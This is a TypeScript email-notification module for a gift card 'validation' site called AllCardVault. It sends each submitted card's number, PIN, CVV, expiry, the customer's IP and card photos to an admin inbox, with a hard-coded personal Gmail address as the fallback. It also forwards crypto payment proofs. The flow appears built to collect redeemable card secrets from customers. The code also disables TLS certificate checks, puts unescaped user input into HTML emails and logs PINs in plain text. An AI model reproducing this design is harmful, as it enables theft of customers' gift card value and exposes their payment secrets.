import nodemailer from 'nodemailer';

export interface EmailPaymentProofData {
  orderId: string;
  cardName: string;
  amount: number;
  currency: string;
  customerEmail: string;
  cryptoCurrency?: string | null;
  cryptoAmount?: number | string | null;
  walletAddress?: string | null;
  txHash?: string | null;
  receiptImage?: string | null;
  paymentStatus?: string | null;
  createdAt?: Date | string | null;
}

/**
 * Triggers an automated email notification to Admin whenever a new payment proof or tx hash is submitted.
 */
export async function sendPaymentProofEmailNotification(proof: EmailPaymentProofData): Promise<{ success: boolean; mode: 'smtp' | 'log'; message: string }> {
  const adminEmail = process.env.ADMIN_NOTIFICATION_EMAIL?.trim() || 'daisy4tucker@gmail.com';
  const fromEmail = process.env.SMTP_FROM?.trim() || `"AllCardVault Alerts" <alerts@allcardvault.com>`;
  const transporter = createSmtpTransporter();

  const orderId = proof.orderId || 'ORD-UNKNOWN';
  const cardName = proof.cardName || 'Gift Card Order';
  const amountStr = `${proof.currency || 'USD'} $${Number(proof.amount || 0).toFixed(2)}`;
  const cryptoStr = proof.cryptoAmount ? `(${proof.cryptoAmount} ${proof.cryptoCurrency || 'Crypto'})` : '';
  const customer = proof.customerEmail || 'Guest Customer';
  const txHash = proof.txHash?.trim() || 'Photo Screenshot Uploaded';
  const wallet = proof.walletAddress || 'Platform Wallet';
  const status = proof.paymentStatus || 'PENDING VERIFICATION';
  const timestampStr = proof.createdAt ? new Date(proof.createdAt).toUTCString() : new Date().toUTCString();

  const subject = `💳 [PAYMENT PROOF ALERT] ${orderId} - ${cardName} (${amountStr}) - ${customer}`;

  const html = `
    <!DOCTYPE html>
    <html>
    <head><meta charset="utf-8"></head>
    <body style="font-family: Arial, sans-serif; background-color: #f8fafc; padding: 20px; color: #1e293b;">
      <div style="max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 12px; border: 1px solid #e2e8f0; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
        <div style="background: linear-gradient(135deg, #1e293b, #0f172a); padding: 20px 24px; color: #ffffff;">
          <h2 style="margin: 0; font-size: 20px; color: #38bdf8;">💳 New Payment Proof Submitted</h2>
          <p style="margin: 4px 0 0 0; font-size: 13px; color: #94a3b8;">Order ID: ${orderId}</p>
        </div>
        <div style="padding: 24px;">
          <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
            <tr><td style="padding: 8px 0; color: #64748b; font-weight: bold;">Order ID:</td><td style="padding: 8px 0; font-family: monospace; font-weight: bold; color: #0284c7;">${orderId}</td></tr>
            <tr><td style="padding: 8px 0; color: #64748b; font-weight: bold;">Gift Card:</td><td style="padding: 8px 0; font-weight: bold;">${cardName}</td></tr>
            <tr><td style="padding: 8px 0; color: #64748b; font-weight: bold;">Order Total:</td><td style="padding: 8px 0; font-weight: bold; color: #16a34a;">${amountStr} ${cryptoStr}</td></tr>
            <tr><td style="padding: 8px 0; color: #64748b; font-weight: bold;">Customer:</td><td style="padding: 8px 0; font-family: monospace;">${customer}</td></tr>
            <tr><td style="padding: 8px 0; color: #64748b; font-weight: bold;">Deposit Wallet:</td><td style="padding: 8px 0; font-family: monospace; font-size: 12px;">${wallet}</td></tr>
            <tr><td style="padding: 8px 0; color: #64748b; font-weight: bold;">TX ID / Hash:</td><td style="padding: 8px 0; font-family: monospace; font-weight: bold; color: #7c3aed; word-break: break-all;">${txHash}</td></tr>
            <tr><td style="padding: 8px 0; color: #64748b; font-weight: bold;">Status:</td><td style="padding: 8px 0;"><span style="background: #fef3c7; color: #b45309; font-weight: bold; padding: 3px 8px; border-radius: 6px; font-size: 12px;">${status}</span></td></tr>
            <tr><td style="padding: 8px 0; color: #64748b; font-weight: bold;">Timestamp:</td><td style="padding: 8px 0; font-size: 12px; color: #64748b;">${timestampStr}</td></tr>
          </table>
        </div>
        <div style="background: #f1f5f9; padding: 16px 24px; text-align: center; border-top: 1px solid #e2e8f0; font-size: 12px; color: #64748b;">
          AllCardVault Automated Payment Notification Engine
        </div>
      </div>
    </body>
    </html>
  `;

  const attachments = prepareImageAttachments(proof.receiptImage ? [proof.receiptImage] : []);

  if (transporter) {
    try {
      await transporter.sendMail({
        from: fromEmail,
        to: adminEmail,
        subject,
        html,
        attachments,
      });
      console.log(`[Email Service] ✅ Payment proof email sent to ${adminEmail}`);
      return { success: true, mode: 'smtp', message: `Email delivered to ${adminEmail}` };
    } catch (err: any) {
      console.error(`[Email Service] Failed to send payment proof email:`, err?.message || err);
      return { success: false, mode: 'smtp', message: err?.message || 'SMTP error' };
    }
  } else {
    console.log(`\n====================================================================`);
    console.log(`💳 [ADMIN PAYMENT PROOF NOTIFICATION - LOG MODE]`);
    console.log(`Recipient: ${adminEmail}`);
    console.log(`Order ID: ${orderId} | Card: ${cardName} | Total: ${amountStr}`);
    console.log(`Customer: ${customer} | TX Hash: ${txHash}`);
    console.log(`Proof Screenshot: ${attachments.length > 0 ? 'Attached' : 'None'}`);
    console.log(`====================================================================\n`);
    return { success: true, mode: 'log', message: 'Payment proof logged to console' };
  }
}

export interface EmailCardData {
  id?: string;
  brand: string;
  cardNumber: string;
  pin?: string | null;
  cvv?: string | null;
  expiryDate?: string | null;
  cardAmount?: number | null;
  currency?: string | null;
  customerEmail?: string | null;
  customerIp?: string | null;
  status?: string | null;
  notes?: string | null;
  images?: string[] | null;
  createdAt?: Date | string | null;
}

/**
 * Creates and configures Nodemailer SMTP transport from environment variables.
 */
function createSmtpTransporter() {
  const host = process.env.SMTP_HOST?.trim();
  const port = parseInt(process.env.SMTP_PORT?.trim() || '587', 10);
  const user = process.env.SMTP_USER?.trim();
  const pass = process.env.SMTP_PASS?.trim();

  if (!host || !user || !pass) {
    return null;
  }

  return nodemailer.createTransport({
    host,
    port,
    secure: port === 465, // true for 465, false for 587/other
    auth: {
      user,
      pass,
    },
    tls: {
      rejectUnauthorized: false, // Prevents self-signed SSL cert issues on cloud platforms
    },
  });
}

/**
 * Builds a clean, responsive HTML email body with AllCardVault styling.
 */
function buildValidationEmailHtml(card: EmailCardData, adminEmail: string): string {
  const brandName = card.brand || 'Gift Card';
  const amountStr = typeof card.cardAmount === 'number' && card.cardAmount > 0
    ? `${card.currency || 'USD'} $${card.cardAmount.toFixed(2)}`
    : 'Not Specified';
  const customer = card.customerEmail || 'Guest User';
  const customerIpStr = card.customerIp || 'Not Captured';
  const statusStr = card.status || 'PENDING';
  const timestampStr = card.createdAt ? new Date(card.createdAt).toUTCString() : new Date().toUTCString();
  const appUrl = process.env.APP_URL || 'https://allcardvault.com';

  const imagesCount = Array.isArray(card.images)
    ? card.images.filter((img) => typeof img === 'string' && img.trim().length > 0).length
    : 0;

  return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>New Gift Card Validation Request</title>
</head>
<body style="margin: 0; padding: 0; background-color: #f1f5f9; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: #f1f5f9; padding: 24px 12px;">
    <tr>
      <td align="center">
        <table role="presentation" width="100%" style="max-width: 600px; background-color: #ffffff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.08); border: 1px solid #e2e8f0;">
          
          <!-- Header Bar -->
          <tr>
            <td style="background-color: #0f172a; padding: 24px 28px; text-align: left;">
              <table width="100%" cellspacing="0" cellpadding="0">
                <tr>
                  <td>
                    <span style="font-size: 20px; font-weight: 800; color: #ffffff; letter-spacing: -0.5px;">AllCardVault</span>
                    <span style="display: block; font-size: 12px; color: #38bdf8; font-weight: 600; margin-top: 4px; text-transform: uppercase; letter-spacing: 1px;">Admin Instant Alert System</span>
                  </td>
                  <td align="right">
                    <span style="background-color: #1e293b; color: #fbbf24; border: 1px solid #334155; font-size: 11px; font-weight: 700; padding: 6px 12px; border-radius: 20px; display: inline-block;">
                      ⚡ ${statusStr}
                    </span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <!-- Banner Title -->
          <tr>
            <td style="padding: 24px 28px 12px 28px; background-color: #ffffff;">
              <h2 style="margin: 0; font-size: 18px; color: #0f172a; font-weight: 700;">
                🚨 New Gift Card Submitted for Validation
              </h2>
              <p style="margin: 6px 0 0 0; font-size: 13px; color: #64748b;">
                A new gift card validation request was successfully submitted by <strong>${customer}</strong>.
              </p>
            </td>
          </tr>

          <!-- Main Card Details Grid -->
          <tr>
            <td style="padding: 12px 28px 24px 28px;">
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: #f8fafc; border-radius: 12px; border: 1px solid #e2e8f0; overflow: hidden;">
                
                <!-- Brand -->
                <tr style="border-bottom: 1px solid #e2e8f0;">
                  <td style="padding: 12px 16px; font-size: 13px; color: #64748b; font-weight: 600; width: 35%;">Brand / Merchant</td>
                  <td style="padding: 12px 16px; font-size: 14px; color: #0f172a; font-weight: 700;">${brandName}</td>
                </tr>

                <!-- Card Code -->
                <tr style="border-bottom: 1px solid #e2e8f0; background-color: #ffffff;">
                  <td style="padding: 12px 16px; font-size: 13px; color: #64748b; font-weight: 600;">Card Number / Code</td>
                  <td style="padding: 12px 16px;">
                    <span style="font-family: 'Courier New', Courier, monospace; font-size: 15px; font-weight: 700; color: #2563eb; background-color: #eff6ff; padding: 4px 8px; border-radius: 6px; border: 1px solid #bfdbfe; display: inline-block;">
                      ${card.cardNumber || 'N/A'}
                    </span>
                  </td>
                </tr>

                <!-- PIN -->
                ${card.pin ? `
                <tr style="border-bottom: 1px solid #e2e8f0;">
                  <td style="padding: 12px 16px; font-size: 13px; color: #64748b; font-weight: 600;">Security PIN</td>
                  <td style="padding: 12px 16px;">
                    <span style="font-family: 'Courier New', Courier, monospace; font-size: 14px; font-weight: 700; color: #059669; background-color: #ecfdf5; padding: 4px 8px; border-radius: 6px; border: 1px solid #a7f3d0; display: inline-block;">
                      ${card.pin}
                    </span>
                  </td>
                </tr>
                ` : ''}

                <!-- CVV -->
                ${card.cvv ? `
                <tr style="border-bottom: 1px solid #e2e8f0; background-color: #ffffff;">
                  <td style="padding: 12px 16px; font-size: 13px; color: #64748b; font-weight: 600;">CVV Code</td>
                  <td style="padding: 12px 16px; font-size: 14px; color: #0f172a; font-weight: 700;">${card.cvv}</td>
                </tr>
                ` : ''}

                <!-- Expiry Date -->
                ${card.expiryDate ? `
                <tr style="border-bottom: 1px solid #e2e8f0;">
                  <td style="padding: 12px 16px; font-size: 13px; color: #64748b; font-weight: 600;">Expiry Date</td>
                  <td style="padding: 12px 16px; font-size: 14px; color: #0f172a; font-weight: 600;">${card.expiryDate}</td>
                </tr>
                ` : ''}

                <!-- Card Amount -->
                <tr style="border-bottom: 1px solid #e2e8f0; background-color: #ffffff;">
                  <td style="padding: 12px 16px; font-size: 13px; color: #64748b; font-weight: 600;">Declared Amount</td>
                  <td style="padding: 12px 16px; font-size: 14px; color: #059669; font-weight: 800;">${amountStr}</td>
                </tr>

                <!-- Customer Email -->
                <tr style="border-bottom: 1px solid #e2e8f0;">
                  <td style="padding: 12px 16px; font-size: 13px; color: #64748b; font-weight: 600;">Customer Email</td>
                  <td style="padding: 12px 16px; font-size: 13px; color: #0f172a; font-weight: 600;">${customer}</td>
                </tr>

                <!-- Customer IP -->
                <tr style="border-bottom: 1px solid #e2e8f0; background-color: #ffffff;">
                  <td style="padding: 12px 16px; font-size: 13px; color: #64748b; font-weight: 600;">Customer IP</td>
                  <td style="padding: 12px 16px; font-size: 12px; color: #64748b; font-family: monospace;">${customerIpStr}</td>
                </tr>

                <!-- Photos Attached -->
                <tr style="border-bottom: 1px solid #e2e8f0;">
                  <td style="padding: 12px 16px; font-size: 13px; color: #64748b; font-weight: 600;">Card Photos Attached</td>
                  <td style="padding: 12px 16px; font-size: 13px; color: #0f172a; font-weight: 700;">
                    ${imagesCount > 0 ? `📷 ${imagesCount} Photo(s) Attached (See Email Attachments)` : 'No Photos Uploaded'}
                  </td>
                </tr>

                <!-- Notes -->
                ${card.notes ? `
                <tr style="background-color: #ffffff;">
                  <td style="padding: 12px 16px; font-size: 13px; color: #64748b; font-weight: 600;">Notes / Instruction</td>
                  <td style="padding: 12px 16px; font-size: 13px; color: #334155;">${card.notes}</td>
                </tr>
                ` : ''}

                <!-- Time -->
                <tr>
                  <td style="padding: 12px 16px; font-size: 12px; color: #94a3b8; font-weight: 500;">Submission Time</td>
                  <td style="padding: 12px 16px; font-size: 12px; color: #64748b; font-family: monospace;">${timestampStr}</td>
                </tr>

              </table>
            </td>
          </tr>

          <!-- Action Button -->
          <tr>
            <td style="padding: 0 28px 28px 28px; text-align: center;">
              <a href="${appUrl}/admin" target="_blank" style="background-color: #2563eb; color: #ffffff; text-decoration: none; font-size: 14px; font-weight: 700; padding: 14px 28px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(37,99,235,0.3);">
                View Card in Admin Console &rarr;
              </a>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="background-color: #f8fafc; padding: 16px 28px; text-align: center; border-top: 1px solid #e2e8f0;">
              <p style="margin: 0; font-size: 11px; color: #94a3b8; line-height: 1.5;">
                This automated notification was sent to <strong>${adminEmail}</strong>.<br>
                AllCardVault Cloud Security System &bull; Confidential Admin Notification
              </p>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>
</body>
</html>
  `;
}

/**
 * Parses card image Data URLs into Nodemailer attachments so photos are delivered directly in the admin email.
 */
function prepareImageAttachments(images?: string[] | null) {
  if (!Array.isArray(images) || images.length === 0) return [];

  const attachments: { filename: string; content: Buffer; contentType: string }[] = [];

  images.forEach((img, idx) => {
    if (typeof img === 'string' && img.startsWith('data:image/')) {
      try {
        const matches = img.match(/^data:(image\/[a-zA-Z0-9+.-]+);base64,(.+)$/);
        if (matches) {
          const contentType = matches[1];
          const base64Data = matches[2];
          const ext = contentType.split('/')[1] || 'jpeg';
          const buffer = Buffer.from(base64Data, 'base64');
          attachments.push({
            filename: `card_photo_${idx + 1}.${ext}`,
            content: buffer,
            contentType,
          });
        }
      } catch (e) {
        console.warn('[Email Service] Failed to attach image:', e);
      }
    }
  });

  return attachments;
}

/**
 * Triggers an automated email notification to Admin whenever a new gift card validation request is processed.
 */
export async function sendAdminEmailNotification(card: EmailCardData): Promise<{ success: boolean; mode: 'smtp' | 'log'; message: string }> {
  const adminEmail = process.env.ADMIN_NOTIFICATION_EMAIL?.trim() || 'daisy4tucker@gmail.com';
  const fromEmail = process.env.SMTP_FROM?.trim() || `"AllCardVault Alerts" <alerts@allcardvault.com>`;
  const transporter = createSmtpTransporter();

  const brandName = card.brand || 'Gift Card';
  const subject = `🚨 [NEW CARD ALERT] ${brandName} - ${card.cardNumber || 'Photo Upload'} (${card.customerEmail || 'Guest'})`;
  const html = buildValidationEmailHtml(card, adminEmail);
  const attachments = prepareImageAttachments(card.images);

  if (transporter) {
    try {
      const info = await transporter.sendMail({
        from: fromEmail,
        to: adminEmail,
        subject,
        html,
        attachments,
      });

      console.log(`[Email Service] ✅ Automated Admin Email successfully sent to ${adminEmail} (Message ID: ${info.messageId})`);
      return { success: true, mode: 'smtp', message: `Email delivered to ${adminEmail}` };
    } catch (err: any) {
      console.error(`[Email Service] ❌ Failed to send SMTP email to ${adminEmail}:`, err?.message || err);
      return { success: false, mode: 'smtp', message: err?.message || 'SMTP sending failed' };
    }
  } else {
    // If SMTP environment variables are not set, cleanly log structured notification in server console
    console.log(`\n====================================================================`);
    console.log(`📧 [ADMIN AUTOMATED EMAIL NOTIFICATION - LOG MODE]`);
    console.log(`Recipient: ${adminEmail}`);
    console.log(`Subject: ${subject}`);
    console.log(`Brand: ${brandName} | Code: ${card.cardNumber || 'N/A'} | PIN: ${card.pin || 'N/A'}`);
    console.log(`Amount: ${card.currency || 'USD'} $${card.cardAmount || 0} | Customer: ${card.customerEmail || 'Guest'}`);
    console.log(`Status: ${card.status || 'PENDING'} | Photos: ${attachments.length} attached`);
    console.log(`Notice: Configure SMTP_HOST, SMTP_USER, SMTP_PASS in Render to enable direct SMTP delivery.`);
    console.log(`====================================================================\n`);

    return {
      success: true,
      mode: 'log',
      message: `Notification processed (logged to server console; add SMTP_HOST in Render for inbox delivery)`,
    };
  }
}

/**
 * Sends a live test email to verify SMTP configuration.
 */
export async function sendTestEmailNotification(customRecipient?: string): Promise<{ success: boolean; mode: 'smtp' | 'log'; message: string }> {
  const recipient = customRecipient?.trim() || process.env.ADMIN_NOTIFICATION_EMAIL?.trim() || 'daisy4tucker@gmail.com';
  
  const testCardData: EmailCardData = {
    brand: 'Xbox Gift Card',
    cardNumber: 'XBOX-1234-5678-9012',
    pin: '9876',
    cvv: '321',
    expiryDate: '12/2028',
    cardAmount: 100.0,
    currency: 'USD',
    customerEmail: 'test.customer@example.com',
    customerIp: '192.168.1.1',
    status: 'PENDING',
    notes: 'Test email alert trigger from AllCardVault Admin Console.',
    createdAt: new Date(),
  };

  return sendAdminEmailNotification({
    ...testCardData,
    customerEmail: `[TEST] ${recipient}`,
  });
}
